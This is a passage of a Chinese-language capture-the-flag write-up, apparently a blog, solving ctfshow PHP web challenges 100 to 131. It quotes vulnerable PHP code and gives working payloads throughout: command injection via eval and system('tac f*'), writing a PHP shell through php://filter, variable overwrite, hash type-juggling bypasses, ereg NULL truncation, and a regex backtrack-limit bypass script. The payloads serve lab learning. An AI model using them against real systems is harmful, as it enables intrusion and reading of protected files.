eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>is_numeric()</strong> 函数用于检测变量是否为数字或数字字符串。PHP 版本要求：PHP 4, PHP 5, PHP 7</p>
<p>v0&#x3D;1，就是说v1为纯数字或者字母，v2中不可以含有分号，但是v3中必须要有分号。</p>
<p>&#x2F;?v1&#x3D;1&amp;v2&#x3D;system(‘tac ctfshow.php’);&amp;v3&#x3D;;</p>
<p>使用反射类直接输出class ctfshow的信息</p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.reflectionclass.php">https://www.php.net/manual/zh/class.reflectionclass.php</a></p>
<p>&#x2F;?v1&#x3D;1&amp;v2&#x3D;echo new ReflectionClass&amp;v3&#x3D;;</p>
<p>因为flag在ctfhsow这个类中，所以我们可以构造出var_dump($ctfshow); </p>
<p>&#x2F;?v1&#x3D;1&amp;v2&#x3D;var_dump($ctfshow)&amp;v3&#x3D;;</p>
<p>把ox2d换成-，再套上flag{}即可，别忘了去掉flag_is_</p>
<h3 id="web-101"><a href="#web-101" class="headerlink" title="web-101"></a>web-101</h3><p>&#x2F;?v1&#x3D;1&amp;v2&#x3D;echo new Reflectionclass&amp;v3&#x3D;;</p>
<p>替换0x2d为-,最后一位需要爆破16次，题目给的flag少一位</p>
<h3 id="web-102"><a href="#web-102" class="headerlink" title="web-102"></a>web-102</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">$v1 = $_POST[&#x27;v1&#x27;];</span><br><span class="line">$v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line">$v3 = $_GET[&#x27;v3&#x27;];</span><br><span class="line">$v4 = is_numeric($v2) and is_numeric($v3);</span><br><span class="line">if($v4)&#123;</span><br><span class="line">    $s = substr($v2,2);</span><br><span class="line">    $str = call_user_func($v1,$s);</span><br><span class="line">    echo $str;</span><br><span class="line">    file_put_contents($v3,$str);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>v2为全字母或数字，从v2前两字符开始取，回调v1，作为v3文件的内容。</p>
<p><em><strong>call_user_func：第一个参数作为回调函数使用</strong></em></p>
<p><em><strong>hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。</strong></em> </p>
<p>那么就很明显了，我们利用v1函数将v3写成php语句，然后放到一个文件中去执行。我们可以用base64去解吗？v1&#x3D;base64-encode，显然是不可以的，因为这样不满足v2为纯数字。我们再套一层bin2hex，然后把v3改成php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php，再套一层解码即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=&#x27;&lt;?=`cat *`;&#x27;;</span><br><span class="line">$b=base64-encode($a);//PD89YGNhdCAqYDs=</span><br><span class="line">$c=bin2hex($b);      //把base64编码之后的=去掉，再转换为16进制，结果是一样的</span><br><span class="line">echo $c;             //5044383959474e6864434171594473 结果中存在着e 会被当做是科学计数法</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&#x2F;?v2&#x3D;005044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php</p>
<p> v1&#x3D;hex2bin</p>
<h3 id="web-104"><a href="#web-104" class="headerlink" title="web-104"></a>web-104</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_POST[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line">    if(sha1($v1)==sha1($v2))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这。。。。。。原意应该是让我们用数组绕过，sha1解析不了返回false所以相同。</p>
<h3 id="web-105"><a href="#web-105" class="headerlink" title="web-105"></a>web-105</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">$error=&#x27;你还想要flag嘛？&#x27;;</span><br><span class="line">$suces=&#x27;既然你想要那给你吧！&#x27;;</span><br><span class="line">foreach($_GET as $key =&gt; $value)&#123;</span><br><span class="line">    if($key===&#x27;error&#x27;)&#123;</span><br><span class="line">        die(&quot;what are you doing?!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;foreach($_POST as $key =&gt; $value)&#123;</span><br><span class="line">    if($value===&#x27;flag&#x27;)&#123;</span><br><span class="line">        die(&quot;what are you doing?!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;</span><br><span class="line">if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;</span><br><span class="line">    die($error);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;your are good&quot;.$flag.&quot;\n&quot;;</span><br><span class="line">die($suces);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>变量覆盖，通过die($error);输出时，我们需要把suces变为flag</p>
<p>&#x2F;?suces&#x3D;flag</p>
<p>error&#x3D;suces</p>
<p>直接跳过if(!($_POST[‘flag’]&#x3D;&#x3D;$flag))</p>
<p>我们可以传多个get参数，使得flag&#x3D;0</p>
<p>&#x2F;?suces&#x3D;flag&amp;flag&#x3D;0</p>
<h3 id="web-106"><a href="#web-106" class="headerlink" title="web-106"></a>web-106</h3><p>&#x2F;?v2[]&#x3D;1</p>
<p>v1[]&#x3D;2</p>
<ol>
<li>aaroZmOk</li>
<li>aaK1STfY</li>
<li>aaO8zKZF</li>
<li>aa3OFF9m</li>
</ol>
<p>这几个经过sha1之后都是0exxx的字符串，为科学计数法，值都为0</p>
<p>sha1碰撞</p>
<h3 id="web-107"><a href="#web-107" class="headerlink" title="web-107"></a>web-107</h3><p>parse_str：如果 <code>string</code> 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 <code>result</code> 则会设置到该数组里 ）。</p>
<p>&#x2F;?v3[]&#x3D;1</p>
<p>v1&#x3D;flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?v3=1</span><br><span class="line">v1=flag=c4ca4238a0b923820dcc509a6f75849b</span><br><span class="line">//1的md5值为 c4ca4238a0b923820dcc509a6f75849b</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">GET:?v3[]=1</span><br><span class="line">POST:v1=1       #POST不传入flag就行,这样v2[&#x27;flag&#x27;]=NULL</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET: ?v3=240610708 </span><br><span class="line">POST: v1=flag=0</span><br><span class="line">//md5($v3)为0e开头的字符串，经过科学记数法之后等于0</span><br></pre></td></tr></table></figure>

<h3 id="web-108"><a href="#web-108" class="headerlink" title="web-108"></a>web-108</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE)  &#123;</span><br><span class="line">    die(&#x27;error&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">strrev()返回 string 反转后的字符串</span><br><span class="line">intval()函数遇到非数字字符就会停止识别， 877aa识别为877</span><br><span class="line">ereg ( string $pattern , string $string , array &amp;$regs = ? ) : int</span><br><span class="line">以区分大小写的方式在 string 中寻找与给定的正则表达式 pattern 所匹配的子串。</span><br><span class="line">ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配,%00是空字符，不是空格什么的，是不可见字符</span><br></pre></td></tr></table></figure>

<p>&#x2F;?c&#x3D;a%00778</p>
<p>ps：%00倒置后是不变的</p>
<h3 id="web-109"><a href="#web-109" class="headerlink" title="web-109"></a>web-109</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/?v1=Exception();system(&#x27;tac f*&#x27;);//&amp;v2=a</span><br><span class="line">/?v1=Exception&amp;v2=system(&quot;tac f*&quot;)</span><br><span class="line"></span><br><span class="line">/?v1=ReflectionClass&amp;v2=system(&#x27;tac f*&#x27;)</span><br></pre></td></tr></table></figure>

<p>调用原生类，和上面有道题很像</p>
<h3 id="web-110"><a href="#web-110" class="headerlink" title="web-110"></a>web-110</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v1))&#123;</span><br><span class="line">            die(&quot;error v1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v2))&#123;</span><br><span class="line">            die(&quot;error v2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    eval(&quot;echo new $v1($v2());&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>符号全过滤了，调用获取目录文件和工作目录的原生类</p>
<p>&#x2F;?v1&#x3D;FilesystemIterator&amp;v2&#x3D;getcwd</p>
<h3 id="web-111"><a href="#web-111" class="headerlink" title="web-111"></a>web-111</h3><p>&#x2F;?v1&#x3D;ctfshow&amp;v2&#x3D;GLOBALS</p>
<p>查看全局变量</p>
<h3 id="web-112"><a href="#web-112" class="headerlink" title="web-112"></a>web-112</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($file)&#123;</span><br><span class="line">    if(preg_match(&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class="line">        die(&quot;hacker!&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">is_file  判断给定文件名是否为一个正常的文件，filename为文件的路径。</span><br><span class="line">//is_file函数可以使用包装器伪协议来绕过，当is_file的参数为伪协议时，返回值为false</span><br><span class="line">//不影响file_get_contents highlight_file</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">可以直接用不带任何过滤器的filter伪协议</span><br><span class="line">/?file=php://filter/resource=flag.php</span><br><span class="line">也可以用一些没有过滤掉的编码方式和转换方式</span><br><span class="line">/?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php</span><br><span class="line">/?file=compress.zlib://flag.php          //(这是读取压缩流)</span><br><span class="line">/?file=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php //(这是两位一反转的读取方式)</span><br><span class="line">/?file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php</span><br></pre></td></tr></table></figure>

<h3 id="web-113"><a href="#web-113" class="headerlink" title="web-113"></a>web-113</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=compress.zlib://flag.php</span><br></pre></td></tr></table></figure>



<p>软连接绕过is_file(不是一个文件)，软连接也可以绕过文件重复包含。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p</span><br><span class="line">roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro</span><br><span class="line">c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/</span><br><span class="line">self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se</span><br><span class="line">lf/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<h3 id="web-114"><a href="#web-114" class="headerlink" title="web-114"></a>web-114</h3><p>没有过滤filter</p>
<p>&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php</p>
<h3 id="web-115"><a href="#web-115" class="headerlink" title="web-115"></a>web-115</h3><p>trim()去除字符串首尾处的空白字符（或者其他字符）、如果不指定第二个参数，将去除这些字符。</p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/trim">https://www.php.net/trim</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($i=0; $i &lt;128 ; $i++) &#123;</span><br><span class="line">	$x=chr($i).&#x27;36&#x27;;</span><br><span class="line">	if(is_numeric($x)===true)&#123;</span><br><span class="line">		echo urlencode(chr($i)).&quot;\n&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">//输出%09 %0A %0B %0C %0D + %2B - . 0 1 2 3 4 5 6 7 8 9</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for($i=0;$i&lt;=128;$i++) &#123;</span><br><span class="line">	$x=chr($i).&#x27;36&#x27;;</span><br><span class="line">	if(trim($x)!==&#x27;36&#x27; &amp;&amp;is_numeric($x))&#123;</span><br><span class="line">		echo urlencode(chr($i)).&quot;\n&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">//输出结果%0C %2B - . 0 1 2 3 4 5 6 7 8 9</span><br></pre></td></tr></table></figure>

<p>除去被过滤的+ - .  只剩下%0c ，也就是换页符\f</p>
<p>绕过就在本地上跑一遍，看看能有什么符合条件</p>
<p>&#x2F;?num&#x3D;%0c36</p>
<h3 id="web-123"><a href="#web-123" class="headerlink" title="web-123"></a>web-123</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class="line">$c=$_POST[&#x27;fun&#x27;];</span><br><span class="line">if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;</span><br><span class="line">    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;, $c)&amp;&amp;$c&lt;=18)&#123;</span><br><span class="line">         eval(&quot;$c&quot;.&quot;;&quot;);  </span><br><span class="line">         if($fl0g===&quot;flag_give_me&quot;)&#123;</span><br><span class="line">             echo $flag;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>分析：第一个难搞的地方isset($_POST[‘CTF_SHOW.COM’])因为php变量命名（字母数字下划线）是不允许使用点号的</p>
<p>PHP变量名应该只有数字字母下划线,同时GET或POST方式传进去的变量名,会自动将空格 + . [转换为_<br>但是有一个特性可以绕过,使变量名出现.之类的<br>特殊字符[, GET或POST方式传参时,变量名中的[也会被替换为_,但其后的字符就不会被替换了</p>
<p>implode — 将一个一维数组的值转化为字符串</p>
<p>get_defined_vars — 返回由所有已定义变量所组成的数组</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF[SHOW.COM=&gt;CTF_SHOW.COM</span><br></pre></td></tr></table></figure>

<p>fun&#x3D;echo $flag&amp;CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;1</p>
<p>CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;1&amp;fun&#x3D;echo implode(get_defined_vars())</p>
<p><em><strong>extract() 函数从数组中将变量导入到当前的符号表。</strong></em></p>
<p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。<br>该函数返回成功设置的变量数目。</p>
<p>CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;1&amp;fun&#x3D;extract($_POST)&amp;fl0g&#x3D;flag_give_me</p>
<p><em><strong>$_SERVER[‘argv’]的利用</strong></em></p>
<p><a target="_blank" rel="noopener" href="http://www.360doc.com/content/18/0203/09/52553745_727370869.shtml">http://www.360doc.com/content/18/0203/09/52553745_727370869.shtml</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、cli模式（命令行）下</span><br><span class="line">第一个参数$_SERVER[&#x27;argv&#x27;][0]是脚本名，其余的是传递给脚本的参数</span><br><span class="line">2、web网页模式下</span><br><span class="line">在web页模式下必须在php.ini开启register_argc_argv配置项，设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果。这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]。$argv,$argc在web模式下不适用</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">因为我们是在网页模式下运行的，所以$_SERVER[&#x27;argv&#x27;][0] = $_SERVER[&#x27;QUERY_STRING&#x27;]也就是$a[0]= $_SERVER[&#x27;QUERY_STRING&#x27;]</span><br><span class="line">这时候我们只要通过 eval(&quot;$c&quot;.&quot;;&quot;);将$fl0g赋值为flag_give_me就可以了。获取查询语句，也就是?后面的语句所以我们只需要通过GET方式传入 赋值的语句$fl0g=flag_give_me;（注意不是fl0g而是$fl0g所以if语句条件是true）所以$a[0]= $_SERVER[&#x27;QUERY_STRING&#x27;]=($fl0g=flag_give_me);</span><br><span class="line">eval(&quot;$c&quot;.&quot;;&quot;)=&gt;eval(eval($a[0]);)=&gt;eval(eval($fl0g=flag_give_me;);)所以成功将flag_give_me赋值给$fl0g,最后执行echo $flag;</span><br></pre></td></tr></table></figure>

<p>&#x2F;?$fl0g&#x3D;flag_give_me;<br>CTF_SHOW&#x3D;6&amp;CTF[SHOW.COM&#x3D;6&amp;fun&#x3D;eval($a[0])</p>
<p>&#x2F;?a&#x3D;1+fl0g&#x3D;flag_give_me<br>CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;parse_str($a[1])</p>
<p><em><strong>可以用加号+进行分隔，从而使得$_SERVER[‘argv’]这个array不仅仅只有[0]。</strong></em></p>
<p>大佬的总结说：</p>
<p>CLI模式下直接把 request info ⾥⾯的argv值复制到arr数组中去</p>
<p>继续判断query string是否为空，</p>
<p>如果不为空把通过+符号分割的字符串转换成php内部的zend_string，</p>
<p>然后再把这个zend_string复制到 arr 数组中去。</p>
<p>这样就可以通过加号+分割argv成多个部分，正如我们上面测试的结果</p>
<p>再说一遍：parse_str — 将字符串解析成多个变量</p>
<h3 id="web-125"><a href="#web-125" class="headerlink" title="web-125"></a>web-125</h3><p>嗝，没过滤var_export，怎么看都是非预期解。</p>
<p>fun&#x3D;var_export(get_defined_vars())&amp;CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;1</p>
<p>&#x2F;?1&#x3D;flag.php<br>CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;highlight_file($_GET[1])</p>
<h3 id="web-126"><a href="#web-126" class="headerlink" title="web-126"></a>web-126</h3><p><code>$_REQUEST</code> — HTTP Request 变量：默认情况下包含了 <code>$_GET</code>，<code>$_POST</code>和 <code>$_COOKIE</code>的数组。</p>
<p>&#x2F;?0&#x3D;var_export($GLOBALS);<br>CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;1&amp;fun&#x3D;eval($_REQUEST[0])</p>
<p>&#x2F;?a&#x3D;1+fl0g&#x3D;flag_give_me<br>CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;parse_str($a[1])</p>
<p>&#x2F;?$fl0g&#x3D;flag_give_me<br>CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;assert($a[0])</p>
<p><em><strong>assert — 检查断言是否为 <code>false</code></strong></em></p>
<h3 id="web-127"><a href="#web-127" class="headerlink" title="web-127"></a>web-127</h3><p><em><strong>由于php的变量名不能带点和空格，所以他们会被转换成下划线，但是这里过滤了.，所以使用空格</strong></em></p>
<p><em><strong>能够被解析成_的ascii为</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">, +(空格) . %5B _            //%5B：[</span><br></pre></td></tr></table></figure>

<p>&#x2F;?ctf show&#x3D;ilove36d</p>
<h3 id="web-128"><a href="#web-128" class="headerlink" title="web-128"></a>web-128</h3><p>&#x2F;?f1&#x3D;_&amp;f2&#x3D;get_defined_vars</p>
<h3 id="web-129"><a href="#web-129" class="headerlink" title="web-129"></a>web-129</h3><p>一个简单的方法就是远程文件包含</p>
<p>&#x2F;?f&#x3D;..&#x2F;ctfshow&#x2F;..&#x2F;..&#x2F;www&#x2F;html&#x2F;flag.php</p>
<p>?f&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode|ctfshow&#x2F;resource&#x3D;flag.php</p>
<h3 id="web-130"><a href="#web-130" class="headerlink" title="web-130"></a>web-130</h3><p>f&#x3D;ctfshow</p>
<p>f[]&#x3D;1</p>
<h3 id="web-131"><a href="#web-131" class="headerlink" title="web-131"></a>web-131</h3><p>呜呜呜，再次参考p神的文章~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p>
<p>s修饰符：</p>
<table>
<thead>
<tr>
<th>s</th>
<th>特殊字符圆点 . 中包含换行符 \n</th>
<th>默认情况下的圆点 . 是 匹配除换行符 \n 之外的任何字符，加上 s 修饰符之后, . 中包含换行符 \n。</th>
</tr>
</thead>
</table>
<blockquote>
<p>PCRE回溯次数限制</p>
<p>.+?深悉正则(pcre)最大回溯&#x2F;递归限制（非贪婪模式）本题</p>
<p><a target="_blank" rel="noopener" href="https://www.laruence.com/2010/06/08/1579.html">https://www.laruence.com/2010/06/08/1579.html</a></p>
<p>PHP利用PCRE回溯次数限制绕过某些安全限制（贪婪模式）</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p>
<p>requests.post() 方法的使用</p>
<p>preg_match() 返回值有三种：</p>
<p>0                未匹配</p>
<p>1                匹配一次</p>
<p>FALSE                    发生错误</p>
<p>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit</p>
<p>回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。这样我们就可以绕过第一个正则表达式了。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://6acb844d-5210-4093-a847-7a0ee4cd7b62.challenge.ctf.show/&quot;</span><br><span class="line">data=&#123;</span><br><span class="line">&#x27;f&#x27;:&#x27;very&#x27;*250000+&#x27;36Dctfshow&#x27;</span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

